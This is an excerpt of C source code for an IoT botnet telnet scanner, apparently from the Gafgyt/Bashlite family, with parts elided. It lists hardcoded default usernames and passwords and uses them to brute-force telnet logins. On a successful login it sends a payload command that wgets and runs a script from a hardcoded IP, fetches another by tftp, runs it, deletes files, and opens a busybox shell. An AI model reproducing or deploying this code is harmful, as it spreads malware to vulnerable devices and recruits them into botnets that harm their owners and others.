...
char *usernames[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "guest\0", "support\0"};
char *passwords[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0"};
...
void TelnetScan(int nothing)
{
        ...
        while(1)
        {
                        ...
                        case 5:
                                {
                                        ...
                                        if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].complete = 1; continue; }
                                        fds[i].state = 6;
                                }
                                break;
                        ...
                        case 6:
                                {
                                        ...
                                        if(readUntil(fds[i].fd, "ncorrect", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                        {
                                                fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
                                                if(strstr(fds[i].sockbuf, "ncorrect") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].complete = 0; continue; }
			...
			case 8:
				{
					if(send(fds[i].fd, "cd /tmp && wget http://172.245.46.147/fucks.sh;sh fucks.sh && rm fucks.sh;tftp -r tftp.sh -g 172.245.46.147 && chmod +x tftp.sh && sh tftp.sh; rm -f *\r\n", 152, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 9;
				}
				break;
			...
			case 9:
                                {
                                        ...
                                        if(readUntil(fds[i].fd, "#", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
                                        {
                                                        fds[i].totalTimeout = 0;
							fds[i].bufUsed = 0;
					...
					else if(readUntil(fds[i].fd, ">", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
					{
						fds[i].totalTimeout = 0;
                                                fds[i].bufUsed = 0;
						send(fds[i].fd, "/bin/busybox;shell\r\n", 20, MSG_NOSIGNAL);
